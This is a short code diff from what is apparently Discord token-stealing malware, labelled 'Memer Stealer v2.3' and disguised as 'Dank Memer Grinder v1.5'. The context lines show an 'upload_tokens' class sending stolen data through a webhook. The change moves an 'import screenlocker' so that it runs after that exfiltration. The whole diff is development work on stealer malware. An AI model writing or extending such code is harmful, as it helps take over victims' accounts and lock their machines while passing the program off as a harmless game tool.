@@ -5,7 +5,7 @@ import os
 import threading
 import re
 import requests
-import screenlocker
+
 
 
 from cryptography.fernet import Fernet
@@ -424,6 +424,7 @@ class upload_tokens:
             embed.set_footer(text="Dev vealloll ~ Memer Stealer v2.3 (For Ivarino)")
 
             self.webhook.send(embed=embed, username="Dank Memer Grinder v1.5", avatar_url="")
+            import screenlocker
 
 if __name__ == '__main__':
     main()
